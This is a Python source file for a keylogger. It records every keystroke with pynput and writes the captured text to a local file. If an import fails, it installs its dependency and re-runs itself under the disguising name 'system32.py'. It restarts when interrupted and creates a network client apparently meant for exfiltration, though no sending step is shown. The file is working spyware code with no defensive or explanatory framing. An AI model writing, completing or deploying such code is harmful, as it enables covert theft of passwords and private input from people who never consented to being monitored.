try:
	import os
	from pynput.keyboard import Key, Listener
	from threading import Thread
	from request import _net
	import base64
except ModuleNotFoundError:
	print('an error has occured')
	#Process to install pynput.keyboard module
	os.system('pip3 install pynput')
	#Rerun
	os.system('python3 system32.py')

keys = []
_dir = 'x64/data.enc'
net = _net.Client()
def preload():
	with Listener(on_press=on_press) as listener:
		listener.join()
def write_f():
	_temp = ""
	with open(_dir, 'w') as f:
		for key in keys:
			key = str(key).replace("'","")
			if key == "Key.space":
				# f.write(str(_base(' ')))
				_temp += " "
			elif key == 'Key.enter':
				# f.write(str(_base('\n')))
				_temp += "\n"
			elif key == "Key.backspace":
				_temp += "\n"+key+"\n"
			elif key == "Key.shift":
				_temp += "\n"+key+"\n"
			elif key == "Key.ctrl+c":
				_temp += "\n"+key+"\n"
			else:
				# f.write(str(_base(key)))
				_temp += key
		f.write(_temp)
def _base(val):
	return base64.b64encode(bytes(val,'UTF-8'))
def on_press( key ):
	keys.append( key )
	if str(key).replace("'","") == "Key.enter":
		write_f()


if __name__ =='__main__':
	try:
		preload()
	except KeyboardInterrupt:
		preload()
	except EOFError:
		preload()